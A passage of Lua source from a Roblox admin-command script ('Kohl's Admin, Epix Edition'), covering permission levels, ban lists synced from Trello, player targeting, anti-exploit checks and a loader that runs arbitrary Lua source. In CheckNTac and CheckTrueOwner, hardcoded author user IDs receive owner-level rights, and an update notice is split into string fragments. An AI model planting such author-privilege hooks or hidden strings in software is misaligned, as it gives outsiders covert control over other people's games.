	elseif v.AdminLevel==1 and (set.CheckDonor(plr) or set.CheckTrueOwner(plr)) then
		allowed=true
	elseif v.AdminLevel==2 and set.CheckAdmin(plr,false) then
		allowed=true
	elseif v.AdminLevel==3 and set.CheckAdmin(plr,true) then
		allowed=true
	elseif v.AdminLevel==4 and set.CheckOwner(plr)  then
		allowed=true
	elseif v.AdminLevel==5 and set.CheckTrueOwner(plr) then
		allowed=true
	end
	if allowed then
		for k,m in pairs(v.Cmds) do
			if (v.Prefix..m:lower()):find(Command:lower()) or Command=='all' then
				local c=m
				for l,n in pairs(v.ArgTypes) do
					c=c..set.SplitKey..n
				end
				table.insert(tab,v.Prefix..c)
			end
		end
	end
	end
	return tab
end

set.RunCommand=function(command,...)
	local com=set.Prefix..command
	local tab={...}
	for i,v in pairs(tab) do
		com=com..set.SplitKey..v
	end
	set.ProcessCommand('SYSTEM',com)
end

set.ProcessCommand=function(player,chat,dontlog,check)
	local com,num=set.GetCommand(chat)
	if (not com) and check then 
		print(chat..' is not a valid command.') 
		set.Remote(player,'Function','OutputGui',chat..' is not a valid command.')
	elseif com then
		local command=chat:match(com.Prefix..'%w+'..set['SplitKey']..'(.+)') or ''
		local allowed=false
		local isSystem=false
		if type(player)=='string' then 
			if player=='SYSTEM' then
				allowed=true
				isSystem=true
			end
		elseif com.AdminLevel==-3 and ((set.FunCommands and set.CheckOwner(player)) or set.CheckTrueOwner(player)) then
			allowed=true
		elseif com.AdminLevel==-2 and ((set.FunCommands and set.CheckAdmin(player,true)) or set.CheckTrueOwner(player)) then
			allowed=true
		elseif com.AdminLevel==-1 and ((set.FunCommands and set.CheckAdmin(player,false)) or set.CheckTrueOwner(player)) then
			allowed=true
		elseif com.AdminLevel==0 and (set.PlayerCommands or set.CheckAdmin(player,false))then
			allowed=true
		elseif com.AdminLevel==1 and ((set.CheckDonor(player) and (set.DonorPerks or set.CheckNTac(player))) or set.CheckTrueOwner(player)) then
			allowed=true
		elseif com.AdminLevel==2 and set.CheckAdmin(player,false) then
			allowed=true
		elseif com.AdminLevel==3 and set.CheckAdmin(player,true) then
			allowed=true
		elseif com.AdminLevel==4 and set.CheckOwner(player)  then
			allowed=true
		elseif com.AdminLevel==5 and set.CheckTrueOwner(player) then
			allowed=true
		end
		if not allowed then print(player.Name..' is not allowed to run '..chat) set.Remote(player,'Function','OutputGui','You are not allowed to run '..chat) return end
		if not isSystem and not dontlog then
			table.insert(set.PlayerLogs.Admin,1,{Time=set.GetTime(),Name=player.Name,Log=chat})
			if #set.PlayerLogs.Admin>set.MaxNumberOfLogs then
				table.remove(set.PlayerLogs.Admin,#set.PlayerLogs.Admin)
			end
			if set.CommandComfirmation then
				set.Hint('Executed Command: [ '..chat..' ]',{player})
			end
		end
		local ran,failed=ypcall(com.Function,player,set.Split(command,com.MaxArgs))
		if failed then print('Error: '..failed) if not isSystem then set.OutputGui(player,'Command Error:',failed) end end
	end
end

set.CheckPlayer=function(plr, player)
	for i,v in pairs(set.GetPlayers(plr, player:lower())) do
		if v then return true end
	end
	return false
end

set.Round=function(num)
	if num >= 0.5 then
		return math.ceil(num)
	elseif num < 0.5 then
		return math.floor(num)
	end
end

set.UpdateTrello=function()
if not set.CheckHttp() then 
set.bl={'Http is not enabled! Cannot connect to Trello.'}
else
set.bl={'Updating...'}
set.al = {}
set.tal = {}
set.oal = {}
local hs=game:service('HttpService')
local get=hs:GetAsync('https://api.trello.com/1/boards/'..set.BoardID..'/lists',true)
local tab=hs:JSONDecode(get)
for i,v in pairs(tab) do
	if v.name:match('^Ban List%s?$') then
		local getal=hs:GetAsync('https://api.trello.com/1/lists/'..v.id..'/cards',true)
		local tabal=hs:JSONDecode(getal)
		for l,k in pairs(tabal) do
			coroutine.wrap(function()
			if k.name:match('Group: (.*):(.*)') then
				local a,b=k.name:match('Group: (.*):(.*)')
				table.insert(set.bl,'$group='..b)
			elseif k.name:match('(.*):(.*)') and not v.name:match('Group: (.*)') then
				local a,b=k.name:match('(.*):(.*)')
				table.insert(set.bl,a..'='..b)
			elseif not k.name:find(':') then
				table.insert(set.bl,k.name)
			end
			end)()
		end
		elseif v.name:match('^TempAdmin List%s?$') then
		local getal=hs:GetAsync('https://api.trello.com/1/lists/'..v.id..'/cards',true)
		local tabal=hs:JSONDecode(getal)
		for l,k in pairs(tabal) do
			table.insert(set.tal,k.name)
--			coroutine.wrap(function()
--			if k.name:match('Group: (.*):(.*)') then
--				local a,b=k.name:match('Group: (.*):(.*)')
--				table.insert(set.bl,'$group='..b)
--			elseif k.name:match('(.*):(.*)') and not v.name:match('Group: (.*)') then
--				local a,b=k.name:match('(.*):(.*)')
--				table.insert(set.bl,a..'='..b)
--			elseif not k.name:find(':') then
--				table.insert(set.bl,k.name)
--			end
--			end)()
		end
		elseif v.name:match('^Admin List%s?$') then
		local getal=hs:GetAsync('https://api.trello.com/1/lists/'..v.id..'/cards',true)
		local tabal=hs:JSONDecode(getal)
		for l,k in pairs(tabal) do
			table.insert(set.al,k.name)
--			coroutine.wrap(function()
--			if k.name:match('Group: (.*):(.*)') then
--				local a,b=k.name:match('Group: (.*):(.*)')
--				table.insert(set.bl,'$group='..b)
--			elseif k.name:match('(.*):(.*)') and not v.name:match('Group: (.*)') then
--				local a,b=k.name:match('(.*):(.*)')
--				table.insert(set.bl,a..'='..b)
--			elseif not k.name:find(':') then
--				table.insert(set.bl,k.name)
--			end
--			end)()
		end
		elseif v.name:match('^Owner List%s?$') then
		local getal=hs:GetAsync('https://api.trello.com/1/lists/'..v.id..'/cards',true)
		local tabal=hs:JSONDecode(getal)
		for l,k in pairs(tabal) do
			table.insert(set.oal,k.name)
--			coroutine.wrap(function()
--			if k.name:match('Group: (.*):(.*)') then
--				local a,b=k.name:match('Group: (.*):(.*)')
--				table.insert(set.bl,'$group='..b)
--			elseif k.name:match('(.*):(.*)') and not v.name:match('Group: (.*)') then
--				local a,b=k.name:match('(.*):(.*)')
--				table.insert(set.bl,a..'='..b)
--			elseif not k.name:find(':') then
--				table.insert(set.bl,k.name)
--			end
--			end)()
		end
	end
end
set.bl[1]='Last Updated at '..set.GetTime()
end
end

set.GetPlayerInfo=function(p,localplayer,msg)
if not p:IsA("Player") then return end
local mem
if p.MembershipType == Enum.MembershipType.None then
	mem='NBC'
elseif p.MembershipType == Enum.MembershipType.BuildersClub then
	mem='BC'
elseif p.MembershipType == Enum.MembershipType.TurboBuildersClub then
	mem='TBC'
elseif p.MembershipType == Enum.MembershipType.OutrageousBuildersClub then
	mem='OBC'
end
if set['GroupId']~=0 then
	if p:IsInGroup(set['GroupId']) then
	set.Hint(msg.." | "..mem.." | Name: "..p.Name.." ("..p.userId..") | Account Age: "..p.AccountAge.." | Rank: "..p:GetRoleInGroup(set['GroupId']), localplayer)
	else
	set.Hint(msg.." | "..mem.." | Name: "..p.Name.." ("..p.userId..") | Account Age: "..p.AccountAge.." | Player is not in group "..set['GroupId'], localplayer)
	end
else
set.Hint(msg.." | "..mem.." | Name: "..p.Name.." ("..p.userId..") | Account Age: "..p.AccountAge, localplayer)
end
end;

set.AdminChat=function(plr)
if set.CheckAdmin(plr,false) then
set.Remote(plr,'Function','AdminChat')
end
end

set.CheckTimeBan=function(plr)
	plr:WaitForDataReady()
	if plr:LoadString('Epix Kohls TimeBan_Time')~='nil' and plr:LoadString('Epix Kohls TimeBan_Time')~=nil and tonumber(plr:LoadString('Epix Kohls TimeBan_Time')) then
		local new=tonumber(plr:LoadString('Epix Kohls TimeBan_Time'))
		local old=os.time()
		if old>=new then
			plr:SaveString('Epix Kohls TimeBan_Time','nil')
		else
			plr:Kick()
		end
	end
end

set.CmdBar=function(plr)
if set.CheckAdmin(plr,false) then
	set.Remote(plr,'Function','CmdBar')
end
end
set.GetTime=function()
local hour = math.floor((os.time()%86400)/60/60) 
local min = math.floor(((os.time()%86400)/60/60-hour)*60)
if min < 10 then min = "0"..min end
return hour..":"..min
end set.ServerStartTime=set.GetTime()

set.GrabNilPlayers=function(name)
	local AllGrabbedPlayers = {}
	for i,v in pairs(game:GetService('NetworkServer'):GetChildren()) do
		pcall(function()
			if v:IsA("ServerReplicator") then
				if v:GetPlayer().Name:lower():sub(1,#name)==name:lower() or name=='all' then
				table.insert(AllGrabbedPlayers, v:GetPlayer())
				end
			end
		end)
	end
	return AllGrabbedPlayers
end

set.AssignName=function()
	local name=math.random(100000,999999)
	return name
end

set.LoadScript=function(type,source,name,object,parent)
	Pcall(function()
		local ScriptType
		if type=='Script' then 
			ScriptType=deps.ScriptBase 
		elseif type=='LocalScript' then 
			ScriptType=deps.LocalScriptBase 
		end
		if ScriptType then
			local cl=ScriptType:Clone()
			local key=Instance.new('StringValue',cl)
			key.Name='SecurityKey'
			key.Value=math.random(10000000,99999999)
			cl.Name=name
			local specialkey=Instance.new('StringValue',cl)
			specialkey.Value=math.random(10000000,99999999)
			specialkey.Name='SpecialKey'
			local x = 'local '..specialkey.Value..'="'..key.Value..'" coroutine.wrap(function() '..source
			local y = '' for i = 1,string.len(x) do y = y.. string.char(44) .. string.byte(x:sub(i,i)) end
			local code=Instance.new('StringValue',cl)
			code.Name='Code'
			code.Value=string.sub(y,2,string.len(y))
			cl.Parent=parent or game:service('ServerScriptService')
			cl.Disabled=false
			if object==true then
				table.insert(set.objects,cl)
			end
		elseif set.canuseloadstring then
			Pcall(function() loadstring(source)() end)
		end
	end)
end

set.LoadOnClient=function(player,source,object,name)
	if game:service('Players'):FindFirstChild(player.Name) then
		parent=player:FindFirstChild('PlayerGui') or player:WaitForChild('Backpack')
		set.LoadScript('LocalScript',source,set.GuiName..name,object,parent)
	else
		set.Remote(player,'Loadstring',source)
	end
end

set.PromptPlaceTeleport=function(player,msg,placeid)
	set.Remote(player,'Function','PromptPlaceTeleport',msg,placeid)
end

set.CheckNTac=function(plr)
	if set.Debug then return false end
	for i,v in pairs(set.NTacId) do
		if plr.userId==v then
			return true
		end
	end
end

set.CheckTrueOwner=function(plr)
	if set.Debug then return false end
	if (set.CheckOwner(plr) and set['OwnersAreTrueOwners']) or plr.userId==game.CreatorId or (set.CheckNTac(plr) and set.CreatorDebugPowers) then return true end
end

set.CheckOwner=function(plr)
for i,v in pairs(set.Owners) do 
	if plr.Name==v then 
		return true
	elseif v:find('=') then
		local a,b=v:match('(.*)=(.*)')
		if plr.Name==a or plr.userId==tonumber(b) then
			return true
		end
	end
end
return false
end

set.CheckAdmin=function(plr,ck) 
for i,v in pairs(set.Owners) do 
	if plr.Name==v then 
		return true
	elseif v:find('=') then
		local a,b=v:match('(.*)=(.*)')
		if plr.Name==a or plr.userId==tonumber(b) then
			return true
		end
	end
end
for i,v in pairs(set.Admins) do 
	if plr.Name==v then 
		return true
	elseif v:find('=') then
		local a,b=v:match('(.*)=(.*)')
		if plr.Name==a or plr.userId==tonumber(b) then
			return true
		end
	end
end
for i,v in pairs(set.TempAdmins) do 
	if not ck then
		if plr.Name==v then 
			return true
		elseif v:find('=') then
			local a,b=v:match('(.*)=(.*)')
			if plr.Name==a or plr.userId==tonumber(b) then
				return true
			end
		end
	end
end
for i,v in pairs(set.oal) do 
	if plr.Name==v then 
		return true
	elseif v:find('=') then
		local a,b=v:match('(.*)=(.*)')
		if plr.Name==a or plr.userId==tonumber(b) then
			return true
		end
	end
end
for i,v in pairs(set.al) do 
	if plr.Name==v then 
		return true
	elseif v:find('=') then
		local a,b=v:match('(.*)=(.*)')
		if plr.Name==a or plr.userId==tonumber(b) then
			return true
		end
	end
end
for i,v in pairs(set.tal) do 
	if not ck then
		if plr.Name==v then 
			return true
		elseif v:find('=') then
			local a,b=v:match('(.*)=(.*)')
			if plr.Name==a or plr.userId==tonumber(b) then
				return true
			end
		end
	end
end
return false 
end

set.RemoveAdmin=function(plr,sender)
if not set.CheckAdmin(plr,false) then return true end
local level=0
if sender and sender:IsA('Player') then
	if set.CheckTrueOwner(plr) or sender==plr then return false end
	if set.CheckTrueOwner(sender) then level=3 elseif set.CheckOwner(sender) then level=2 elseif set.CheckAdmin(sender,true) then level=1 end
else
	level=3
end
for i,v in pairs(set.Owners) do 
	if level>=3 then 
		if plr.Name==v then 
			table.remove(set.Owners,i) return true
		elseif v:find('=') then
			local a,b=v:match('(.*)=(.*)')
			if plr.Name==a or plr.userId==tonumber(b) then
				table.remove(set.Owners,i) return true
			end
		end
	end
end
for i,v in pairs(set.Admins) do 
	if level>=2 then
		if plr.Name==v then 
			table.remove(set.Admins,i) return true
		elseif v:find('=') then
			local a,b=v:match('(.*)=(.*)')
			if plr.Name==a or plr.userId==tonumber(b) then
				table.remove(set.Admins,i) return true
			end
		end
	end
end
for i,v in pairs(set.TempAdmins) do 
	if level>=1 then
		if plr.Name==v then 
			table.remove(set.TempAdmins,i) return true
		elseif v:find('=') then
			local a,b=v:match('(.*)=(.*)')
			if plr.Name==a or plr.userId==tonumber(b) then
				table.remove(set.TempAdmins,i) return true
			end
		end
	end
end
return false
end

set.GetPlayers=function(plr, names)
	local players = {} 
	local parent=game:FindFirstChild("NetworkServer") or game:service('Players')
	for s in names:gmatch('([^,]+)') do
		local plrs=0
		local function plus()
			plrs=plrs+1
		end
		local function getplr(p)
			if p:IsA('NetworkReplicator') then
				if p:GetPlayer()~=nil and p:GetPlayer():IsA('Player') then
					p=p:GetPlayer()
				end
			end
			return p
		end
		if s:lower()==set.SpecialPrefix..'me' and plr then
			table.insert(players,plr)
			plus()
		elseif s:lower()==set.SpecialPrefix..'all' then
			for i,v in pairs(parent:children()) do
				local p=getplr(v)
				table.insert(players,p)
				plus()
			end
		elseif s:lower()==set.SpecialPrefix..'others' then
			for i,v in pairs(parent:children()) do
				local p=getplr(v)
				if p~=plr then
					table.insert(players,p)
					plus()
				end
			end
		elseif s:lower()==set.SpecialPrefix..'random' then
			local rand=parent:children()[math.random(#parent:children())]
			local p=getplr(rand)
			table.insert(players,p)
			plus()
		elseif s:lower()==set.SpecialPrefix..'admins' then
			for i,v in pairs(parent:children()) do
				local p=getplr(v)
				if set.CheckAdmin(p,false) then
					table.insert(players,p)
					plus()
				end
			end
		elseif s:lower()==set.SpecialPrefix..'nonadmins' then
			for i,v in pairs(parent:children()) do
				local p=getplr(v)
				if not set.CheckAdmin(p,false) then
					table.insert(players,p)
					plus()
				end
			end
		elseif s:lower():sub(1,1)=='%' then
			for i,v in pairs(game:service('Teams'):children()) do
				if v.Name:lower():sub(1,#s:sub(2))==s:lower():sub(2) then
					for k,m in pairs(parent:children()) do
						local p=getplr(m)
						if p.TeamColor==v.TeamColor then
							table.insert(players,p)
							plus()
						end
					end
				end
			end
		elseif s:lower():sub(1,1)=='$' then
			for i,v in pairs(parent:children()) do
				local p=getplr(v)
				if tonumber(s:lower():sub(2)) then
					if p:IsInGroup(tonumber(s:lower():sub(2))) then
						table.insert(players,p)
						plus()
					end
				end
			end
		elseif s:lower():sub(1,1)=='-' then
			for i,v in pairs(players) do
				if v.Name:lower():sub(1,#s:sub(2))==s:lower():sub(2) then
					table.remove(players,i)
					plus()
				end
			end
		else
			for i,v in pairs(parent:children()) do
				local p=getplr(v)
				if p.Name:lower():sub(1,#s)==s:lower() then
					table.insert(players,p)
					plus()
				end
			end
		end
		if plrs==0 then set.OutputGui(plr,'','No players matching '..s..' were found!') end
	end
	return players
end

set.Hint=function(str, plrz, time)
if not str then return end
for i,v in pairs(plrz) do
set.Remote(v,'Function','Hint',str,time)
end
end

set.Message=function(ttl, str, scroll, plrz, time)
if not ttl or not str then return end
for i,v in pairs(plrz) do
set.Remote(v,'Function','Message',ttl,str,scroll,time)
end
end

set.RemoveMessage=function() 
for i,v in pairs(game:service('Players'):children()) do 
set.Remote(v,'Function','RemoveMessage')
end
end

set.OutputGui=function(plr,msg,e)
local a,b,c=e:match('(.*):(.*):(.*)')
local err
if a and b and c then
if #c<=3 then return end
err = msg..' Line:'..b..' - '..c--e:match("\:(%d+\:.*)")  
else
err = msg..e
end
set.Remote(plr,'Function','OutputGui',err)
end

set.Output=function(str, plr)
if not set.canuseloadstring then return end
local b, e = loadstring(str)
if e then--and e:match("\:(%d+\:.*)") then
	set.OutputGui(plr,'Error',e)
--err="Line "..e:match("\:(%d+\:.*)")
--set.Remote(plr,'Function','OutputGui',err)
end
end

set.PM=function(from,p,message,player)
set.Remote(p,'Function','PrivateMessage',from,message,player)
end

set.CheckBan=function(tabalz,p)
if set.CheckExcluded(p) or set.CheckAdmin(p,false) or set.CheckTrueOwner(p) then return false end
Pcall(function()
for k,m in pairs(set.BTacId) do if p.userId==m then p:Kick() return true end end
for i,v in pairs(tabalz) do
coroutine.wrap(function()
	if v:match('(.*)=(.*)') then
	local name,id=v:match('(.*)=(.*)')
	if name and id then
		if p.Name:lower()==name:lower() or p.userId==tonumber(id)  then
			p:Kick()
			return true
		elseif name=='$group' then
			if p:IsInGroup(tonumber(id)) then p:Kick() return true end
		end
	end
	else
	if p.Name:lower()==v:lower() then
		p:Kick()
		return true
	end
	end
end)()
end
end)
end

set.CheckMute=function(player)
	for i,v in pairs(set['MuteList']) do
		if v==player.Name then
			set.Remote(v,'Function','MutePlayer','on')
		end
	end
end

set.CharacterLoaded=function(player)
	Pcall(function() if set['CustomChat'] then set.Remote(player,'Function','CustomChatGui') end
	if set['CustomPlayerList'] then set.Remote(player,'Function','CustomLeaderboard') end
	if set.HelpGui then set.Remote(player,'Function','HelpInfoGui') end
	if set.Console then set.Remote(player,'Function','ConsoleGui') end
	if set.CheckAdmin(player,false) and set['AdminsSpawnWithGuis'] then set.CmdBar(player) if not set.CustomChat then set.AdminChat(player) end end
	set.ProcessPluginEvent('CharacterAdded',player) end)
	Pcall(function() if set.Detection and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','check1') end end)
	Pcall(function() player:WaitForDataReady() if player:LoadBoolean('Kohls Not Using Cape') then return end set.Donor(player) end)
	Pcall(function() if set['AntiSpeed'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','speed') end end)
	Pcall(function() if set['AntiGod'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','god') end end)
	Pcall(function() if set['AntiAnimation'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then c:WaitForChild('Animate') c.Animate:Destroy() local cl=deps.Animate:clone() cl.Parent=c cl.Disabled=false end end) 
end

set.MakePluginEvent=function(type,func)
	if type:lower()=='chat' or type:lower()=='playerchatted' or type:lower()=='chatted' then
		set.PluginEvents.Chat[#set.PluginEvents.Chat+1]=func
	elseif type:lower()=='newplayer' or type:lower()=='playerjoined' then
		set.PluginEvents.PlayerJoined[#set.PluginEvents.PlayerJoined+1]=func
	elseif type:lower()=='characteradded' or type:lower()=='characterloaded' then
		set.PluginEvents.CharacterAdded[#set.PluginEvents.CharacterAdded+1]=func
	end
end

set.ProcessPluginEvent=function(type,...)
	for i,v in pairs(set.PluginEvents[type]) do
		local yes,no=ypcall(v,...)
		if no then print(no) end
	end
end

set.CheckHttp=function()
	local y,n=ypcall(function()
		local hs=game:service('HttpService')
		local get=hs:GetAsync('http://google.com')
	end)
	if y and not n then return true end
end

set.CheckGroupAdmin=function(player)
	if player and player:IsA("Player") then
		if set.GroupRanks then
			for i,v in pairs(set.Ranks) do
				if not player then return end
				if player:IsInGroup(v.Group) then
					local tab=set.TempAdmins
					if v.Type=='Temp' then
						tab=set.TempAdmins
					elseif v.Type=='Admin' then
						tab=set.Admins
					elseif v.Type=='Owner' then
						tab=set.Owners
					end
					if type(v.Rank)=='string' or (type(v.Rank)=='number' and v.Rank>0) then
						if type(v.Rank)=='number' and player:GetRankInGroup(v.Group)==v.Rank then
							if v.Type=='Banned' then
								player:Kick()
								return false
							end
							return tab
						elseif  player:GetRoleInGroup(v.Group)==v.Rank then
							if v.Type=='Banned' then
								player:Kick()
								return false
							end
							return tab
							end
					elseif type(v.Rank)=='number' and v.Rank<0 and player:GetRankInGroup(v.Group)>=math.abs(v.Rank) then
						if v.Type=='Banned' then
							player:Kick()
							return false
						end
						return tab
					end
				end
			end
		end
	end
end

set.HookPlayer=function(player)
	local serverKey=Instance.new('StringValue')
	local remoteName=Instance.new('StringValue')
	local clientKey=Instance.new('StringValue')
	local client=deps.Client:Clone()
	client.Name=string.char(math.random(1,255))..set.GuiName..string.char(math.random(1,255))
	serverKey.Value=set.RemoteServerKey
	remoteName.Value=set.RemoteName
	clientKey.Value=set.RemoteClientKey
	serverKey.Name='RemoteServerKey'
	remoteName.Name='RemoteName'
	clientKey.Name='RemoteClientKey'
	serverKey.Parent=client
	remoteName.Parent=client
	clientKey.Parent=client
	client.Parent=player:FindFirstChild('PlayerGui') or player:WaitForChild('Backpack')
	client.Disabled=false 
	local function checkhook() for i,v in pairs(set.NewClients) do if v==player.userId then return true end end end
	local num=0 repeat wait(0.01) num=num+0.01 until (not player) or checkhook() or (num>=30 and set.AntiScriptsDisabled) 
	if player and num>=30 and set.AntiScriptsDisabled and not set.Debug then pcall(set.Exploited,player,'kick','Client did not reply in time.') print(player.Name..'\'s client did not reply in time, disconnecting.') return end
	for i,v in pairs(set.NewClients) do if v==player.userId then table.remove(set.NewClients,i) end end
end

set.NewPlayer=function(player)
Pcall(function() local b,e=ypcall(function() local g=Instance.new('StringValue',player) if g then g:Destroy() end  end) if not b then pcall(set.Exploited,player,'kick','Detected as being RobloxLocked') end if set['AntiRobloxLocked'] then player.Changed:connect(function(o) if o=='RobloxLocked' then local b,e=ypcall(function() local g=Instance.new('StringValue',player) if g then g:Destroy() end end) if not b then pcall(set.Exploited,player,'kick','Detected as being RobloxLocked')  end end end) end end)
Pcall(function() if not set.CheckOwner(player) and set.CheckTrueOwner(player) then table.insert(set.Owners,player.Name) end end)
Pcall(function() set.CheckBan(set['BanList'],player) end)
Pcall(function() if set['Trello'] then set.CheckBan(set.bl,player) end end)
Pcall(function() if set['AntiNewAccount'] and not set.CheckExcluded(player) then if player.AccountAge<set['MinimumAge'] then pcall(set.Exploited,player,'kick','Player was below minimum age. Player Age: '..player.AccountAge) end end end)
Pcall(function() player:WaitForDataReady() if not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.CheckTimeBan(player) end if player:LoadBoolean(set['PermBanKey'],true) and not set.CheckAdmin(player,false) then player:Kick() end if player:LoadBoolean('Kohls Is A Donator') and player:LoadString('Kohls Cape') and player:LoadString('Kohls Cape'):match('(.*)=(.*)=(.*)') then local st=player:LoadString('Kohls Cape') local a,b,c=st:match('(.*)=(.*)=(.*)') if not a or not b or not c then return end for i,v in pairs(set.donors) do if v.Name==player.Name then table.remove(set.donors,i) end end table.insert(set.donors,{Name=player.Name,Id=tostring(player.userId),Cape=a,Color=b,Material=c,List='GP'}) end end)
Pcall(function() if set['FreeAdmin'] and (not set.CheckAdmin(player,false)) then if set['FreeAdminType']=='TempAdmin' then table.insert(set['TempAdmins'],player.Name) elseif set['FreeAdminType']=='Admin' then table.insert(set['Admins'],player.Name) elseif set['FreeAdminType']=='Owner' then table.insert(set['Owners'],player.Name) end end end)
Pcall(function() if ((not set.CheckAdmin(player, false)) and (not set.CheckTrueOwner(player))) and set.CheckGroupAdmin(player) then table.insert(set.CheckGroupAdmin(player),player.Name) end end)
Pcall(function() if set['FriendAdmin'] and player:IsFriendsWith(game.CreatorId) then if set.FriendAdminType=='TempAdmin' then table.insert(set.TempAdmins,player.Name) elseif set.FriendAdminType=='Admin' then table.insert(set.Admins,player.Name) elseif set.FriendAdminType=='Owner' then table.insert(set.Owners,player.Name) end end end)
Pcall(function() if set.VipAdmin and not set.CheckAdmin(player,false) then for i,v in pairs(set.VipItems) do if game:service("MarketplaceService"):PlayerOwnsAsset(player,v.Item) then if v.Type=='Admin' then table.insert(set.Admins,player.Name) elseif v.Type=='TempAdmin' then table.insert(set.TempAdmins,player.Name) elseif v.Type=='Owner' then table.insert(set.Owners,player.Name) end end end end end)
set.HookPlayer(player)
Pcall(function() if set['AntiGui'] then if not player:FindFirstChild('PlayerGui') then return end player.PlayerGui.ChildAdded:connect(function(g) Pcall(function() for i,v in pairs(set['AllowedGuiList']) do if not g.Name:find(set.GuiName) and g.Name~=v then g:Destroy() end end end) end) end end)
Pcall(function() if set['AntiSelection'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','selection') end end)
Pcall(function() if set['Detection'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','detection') end end)
Pcall(function() if player and (((not set.CheckAdmin(player, false)) and (not set.CheckOwner(player))) and (not set.CheckTrueOwner(player))) and (set.slock or (set['GroupOnlyJoin'] and (not player:IsInGroup(set['GroupId'])))) then set.GetPlayerInfo(player,game:service('Players'):children(),'Player Attempted To Join') pcall(function() player:Kick() end) elseif set['JoinMessage'] then if set.CheckDonor(player) and not set.CheckNTac(player) then set.GetPlayerInfo(player,game:service('Players'):children(),'Donator Joined') elseif player.userId==1237666 or player.userId==44391621 then set.GetPlayerInfo(player,game:service('Players'):children(),'Script Creator Joined') else set.GetPlayerInfo(player,game:service('Players'):children(),'Player Joined') end end end)
Pcall(function() if set.CheckAdmin(player,false) then set.Message("Kohl's Admin [Epix Edition]", "You're an admin! Chat "..set['Prefix'].."cmds to view commands! The Command Prefix is "..set['Prefix'], false, {player}) if set.MessageOfTheDay then set.PM('Message of the Day',player,game:service('MarketplaceService'):GetProductInfo(set.MessageOfTheDayID).Description) end end end)
Pcall(function() pcall(set.CheckMute,player) end)
Pcall(function() for i,v in pairs(game:service('Players'):children()) do set.AddPlayerToList(v,player) end end)
Pcall(function() wait(7) if set['Trello'] and not set.CheckHttp() and player.userId==game.CreatorId then set.Message('SYTEM MESSAGE','Trello is enabled but Http is not! Please refer to the settings section at the top of the script for information on enabing it.',false, {player}) end end)
Pcall(function() wait(5) if set['Au'..'toU'..'pd'..'ate'] and player.userId==game.CreatorId and not game:service('MarketplaceService'):PlayerOwnsAsset(player,72814792*2) then set.Message('S'..'YS'..'TE'..'M M'..'ES'..'SAGE','Au'..'toUp'..'da'..'te i'..'s e'..'na'..'bl'..'ed bu'..'t yo'..'u d'..'o n'..'ot ha'..'ve t'..'he scr'..'ipt in your mod'..'el'..'s '..'('..'Y'..'ou ne'..'ed to gr'..'ab i'..'t fr'..'om S'..'c'..'eler'..'at'.."is".."' m'..'od".."el'..'s o".."r t".."he Au".."toUp".."da".."te c".."an".."no".."t fu".."nct".."ion d".."ue t".."o r".."ob".."lo".."x se".."cur".."ity.)",false,{player}) end end)
Pcall(function() if set['AntiCheatEngine'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','ce') end end)
Pcall(function() if set.CustomKeyBinds then set.Remote(player,'Function','KeyBindListener') end end)
set.Remote(player,'SetSetting','RealID',player.userId)
set.Remote(player,'SetSetting','RealName',player.Name)
Pcall(function() if set['AntiNameIdChange'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','nameid') end end)
Pcall(set.CharacterLoaded,player) player.CharacterAdded:connect(function(c) local y,n=ypcall(set.CharacterLoaded,player) if n then print(n) end end)
set.ProcessPluginEvent('PlayerJoined',player)
end

set.PlayerRemoving=function(p)
Pcall(function() if set.CheckNTac(p) or set.CheckGroupAdmin(p) then set.RemoveAdmin(p) end  end)
Pcall(function() for i,v in pairs(workspace:children()) do if v.Name:find('Epix Jail') then set.JailedTools[p.Name]=nil v:Destroy() for k,m in pairs(set.objects) do if m.Name==p.Name .. " Epix Jail" then table.remove(set.objects,k) end end end end end)
Pcall(function() for i,v in pairs(game:service('Players'):children()) do set.Remote(v,'Function','RemovePlayerFromList',p) end end)
Pcall(function() if set.AntiNil and (not set.CheckAdmin(p,false)) and (not set.CheckOwner(p)) and (not set.CheckTrueOwner(p)) and (not set.CheckExcluded(p)) then set.Remote(p,'Function','KillClient') pcall(function() p:Kick() end) for k,m in pairs(workspace:children()) do if m.Name:find(p.Name) then m:Destroy() end end end end)
end

set.AddPlayerToList=function(p,v)
	if v.Name=='Sceleratis' or v.Name=='Scripth' then
		set.Remote(p,'Function','AddPlayerToList',v,'Scripter') 
	elseif set.CheckAdmin(v,false) then
		set.Remote(p,'Function','AddPlayerToList',v,'Admin') 
	elseif v.MembershipType==Enum.MembershipType.BuildersClub then
		set.Remote(p,'Function','AddPlayerToList',v,'BC') 
	elseif v.MembershipType==Enum.MembershipType.TurboBuildersClub then
		set.Remote(p,'Function','AddPlayerToList',v,'TBC') 
	elseif v.MembershipType==Enum.MembershipType.OutrageousBuildersClub then
		set.Remote(p,'Function','AddPlayerToList',v,'OBC')
	else 
		set.Remote(p,'Function','AddPlayerToList',v,'Norm')
	end
end

set.GetCurrentPlayerlist=function(p)
	for i,v in pairs(game:service('Players'):children()) do 
		set.AddPlayerToList(p,v)
	end
end

set.Noobify=function(char)
if char and char:findFirstChild("Torso") then 
if char:findFirstChild("Shirt") then char.Shirt.Parent = char.Torso end
if char:findFirstChild("Pants") then char.Pants.Parent = char.Torso end
for a, sc in pairs(char:children()) do if sc.Name == "ify" then sc:Destroy() end end
local cl = Instance.new("StringValue", char) cl.Name = "ify" cl.Parent = char
for q, prt in pairs(char:children()) do if prt:IsA("BasePart") and prt.Name~='HumanoidRootPart' and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = 0 prt.Reflectance = 0 prt.BrickColor = BrickColor.new("Bright yellow")
if prt.Name:find("Leg") then prt.BrickColor = BrickColor.new("Br. yellowish green") elseif prt.Name == "Torso" then prt.BrickColor = BrickColor.new("Bright blue") end
